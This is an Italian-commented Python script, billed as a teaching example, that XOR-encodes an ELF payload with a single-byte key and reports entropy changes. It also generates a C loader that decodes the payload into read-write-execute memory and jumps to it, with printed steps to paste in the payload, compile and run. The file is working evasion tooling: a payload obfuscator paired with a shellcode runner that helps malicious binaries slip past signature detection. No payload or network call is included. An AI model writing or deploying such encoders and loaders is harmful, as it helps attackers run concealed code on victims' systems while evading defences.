#!/usr/bin/env python3
"""
ENCODER XOR PERSONALIZZATO
Esempio didattico di encoder semplice per payload ELF
"""

import argparse
import os
import random
import sys

class XOREncoder:
    def __init__(self, key=None):
        self.key = key if key is not None else random.randint(1, 255)
        self.stats = {
            'original_size': 0,
            'encoded_size': 0,
            'bytes_processed': 0
        }
    
    def calculate_entropy(self, data):
        """Calcola l'entropia di Shannon dei dati"""
        from collections import Counter
        import math
        
        if len(data) == 0:
            return 0.0
            
        counter = Counter(data)
        entropy = 0.0
        
        for count in counter.values():
            p_x = count / len(data)
            entropy += -p_x * math.log2(p_x)
            
        return entropy
    
    def encode_file(self, input_file, output_file):
        """Codifica un file usando XOR"""
        try:
            print(f"🔍 Lettura file: {input_file}")
            
            with open(input_file, 'rb') as f:
                original_data = f.read()
            
            self.stats['original_size'] = len(original_data)
            original_entropy = self.calculate_entropy(original_data)
            
            print(f"📏 Dati originali: {self.stats['original_size']} bytes")
            print(f"🎲 Entropia originale: {original_entropy:.4f}")
            print(f"🔑 Chiave XOR: 0x{self.key:02x} ({self.key})")
            
            # Applica XOR a ogni byte
            encoded_data = bytearray()
            for byte in original_data:
                encoded_byte = byte ^ self.key
                encoded_data.append(encoded_byte)
                self.stats['bytes_processed'] += 1
            
            # Salva il file codificato
            with open(output_file, 'wb') as f:
                f.write(encoded_data)
            
            self.stats['encoded_size'] = len(encoded_data)
            encoded_entropy = self.calculate_entropy(encoded_data)
            
            print(f"✅ File codificato: {output_file}")
            print(f"📏 Dati codificati: {self.stats['encoded_size']} bytes")
            print(f"🎲 Entropia codificata: {encoded_entropy:.4f}")
            print(f"📈 Differenza entropia: {encoded_entropy - original_entropy:+.4f}")
            
            # Mostra anteprima bytes
            print("\n🔍 ANTEPRIMA BYTES (prime 16):")
            print(f"Originale:  {original_data[:16].hex()}")
            print(f"Codificato: {encoded_data[:16].hex()}")
            
            return True
            
        except Exception as e:
            print(f"❌ Errore durante la codifica: {e}")
            return False
    
    def generate_decoder(self, output_file):
        """Genera codice decoder in C"""
        decoder_code = f'''
/*
DECODER XOR AUTOMATICO
Chiave: 0x{self.key:02x}
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

void decode_payload(unsigned char* data, size_t size) {{
    for(size_t i = 0; i < size; i++) {{
        data[i] ^= 0x{self.key:02x};
    }}
}}

void execute_decoded(unsigned char* payload, size_t size) {{
    // Alloca memoria eseguibile
    void* exec_mem = mmap(NULL, size, 
                         PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (exec_mem == MAP_FAILED) {{
        perror("mmap failed");
        return;
    }}
    
    // Copia e decodifica
    memcpy(exec_mem, payload, size);
    decode_payload((unsigned char*)exec_mem, size);
    
    // Esegue
    void (*func)() = (void(*)())exec_mem;
    func();
    
    // Cleanup
    munmap(exec_mem, size);
}}

int main() {{
    // PAYLOAD CODIFICATO VIENE INSERITO QUI
    unsigned char encoded_payload[] = {{ 
        // ${self.stats['encoded_size']} bytes di payload codificato
    }};
    
    size_t payload_size = sizeof(encoded_payload);
    execute_decoded(encoded_payload, payload_size);
    
    return 0;
}}
'''
        
        try:
            with open(output_file, 'w') as f:
                f.write(decoder_code)
            print(f"✅ Decoder C generato: {output_file}")
            return True
        except Exception as e:
            print(f"❌ Errore generazione decoder: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(
        description='Encoder XOR Personalizzato - Esempio Didattico',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Esempi:
  %(prog)s -i payload.elf -o encoded.elf -k 170
  %(prog)s -i original.elf -o encoded.elf --generate-decoder
        '''
    )
    
    parser.add_argument('-i', '--input', required=True, help='File input da codificare')
    parser.add_argument('-o', '--output', required=True, help='File output codificato')
    parser.add_argument('-k', '--key', type=lambda x: int(x, 0), help='Chiave XOR (dec, hex: 0xAA)')
    parser.add_argument('-g', '--generate-decoder', action='store_true', help='Genera decoder C')
    
    args = parser.parse_args()
    
    # Verifica file input
    if not os.path.exists(args.input):
        print(f"❌ File non trovato: {args.input}")
        sys.exit(1)
    
    # Crea encoder
    encoder = XOREncoder(args.key)
    
    print("🛠️  ENCODER XOR PERSONALIZZATO")
    print("=" * 40)
    
    # Codifica file
    if not encoder.encode_file(args.input, args.output):
        sys.exit(1)
    
    # Genera decoder se richiesto
    if args.generate_decoder:
        decoder_file = args.output.replace('.elf', '_decoder.c')
        encoder.generate_decoder(decoder_file)
        
        print(f"\n🎯 ISTRUZIONI PER COMPILARE:")
        print(f"1. Sostituisci l'array encoded_payload in {decoder_file}")
        print(f"2. Compila: gcc -o decoder {decoder_file}")
        print(f"3. Esegui: ./decoder")

if __name__ == "__main__":
    main()
